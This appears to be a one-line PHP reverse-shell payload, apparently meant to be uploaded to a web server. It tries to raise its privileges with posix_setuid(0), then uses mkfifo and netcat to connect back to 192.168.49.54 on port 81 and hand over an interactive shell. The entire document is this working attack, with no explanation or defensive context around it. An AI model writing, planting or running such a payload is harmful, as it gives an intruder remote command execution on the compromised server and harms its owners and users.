<?php @posix_setuid(0); system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.49.54 81 >/tmp/f"); ?>
